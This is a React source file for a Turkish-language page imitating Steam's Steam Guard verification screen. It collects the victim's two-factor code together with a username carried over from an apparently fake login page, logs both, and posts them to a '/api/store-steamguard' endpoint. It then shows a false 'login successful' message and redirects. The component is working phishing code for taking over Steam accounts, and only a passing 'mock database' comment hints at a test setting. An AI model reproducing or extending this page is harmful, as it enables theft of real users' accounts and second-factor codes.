
import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Shield, Loader } from 'lucide-react';
import { toast } from 'sonner';

const SteamGuard = () => {
  const [guardCode, setGuardCode] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { username } = location.state || { username: '' };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Log the Steam Guard code for tracking
    console.log('Steam Guard code submitted:', guardCode, 'for username:', username);

    // Send the code to the mock database
    fetch('/api/store-steamguard', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ code: guardCode, username }),
    }).then(() => {
      toast.success("Giriş başarılı! Yönlendiriliyorsunuz...");
      
      // Redirect to home after 1.5 seconds
      setTimeout(() => {
        navigate('/');
      }, 1500);
    }).catch(error => {
      console.error("Error storing Steam Guard code:", error);
      toast.error("Bir hata oluştu. Lütfen tekrar deneyin.");
      setIsSubmitting(false);
    });
  };

  return (
    <div className="min-h-screen bg-[#171a21] flex flex-col items-center justify-center p-4">
      <div className="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full">
        <div className="text-center mb-6">
          <Shield className="h-16 w-16 text-blue-400 mx-auto mb-4" />
          <h1 className="text-xl font-bold text-white">Steam Guard Doğrulama</h1>
          <p className="text-sm text-white/70 mt-2">
            E-posta adresinize gönderilen veya Steam Authenticator mobil uygulamasındaki kodu girin.
          </p>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-sm font-medium text-white/70">
              Steam Guard Kodu
            </label>
            <Input
              value={guardCode}
              onChange={(e) => setGuardCode(e.target.value)}
              className="bg-[#32353c] border-0 text-white text-center tracking-widest text-xl h-12"
              placeholder="XXXXX"
              maxLength={5}
              disabled={isSubmitting}
            />
          </div>
          
          <Button 
            type="submit" 
            className="w-full h-10 bg-blue-400 hover:bg-blue-500 text-white"
            disabled={isSubmitting}
          >
            {isSubmitting ? (
              <>
                <Loader className="mr-2 h-4 w-4 animate-spin" />
                Doğrulanıyor...
              </>
            ) : (
              'Gönder'
            )}
          </Button>
          
          <div className="pt-4 border-t border-[#32353c]">
            <p className="text-xs text-white/60 text-center">
              Steam Guard kodunuzu bulamıyor musunuz? <br />
              <a href="#" className="text-blue-400 hover:underline">Yardım için buraya tıklayın</a>
            </p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default SteamGuard;
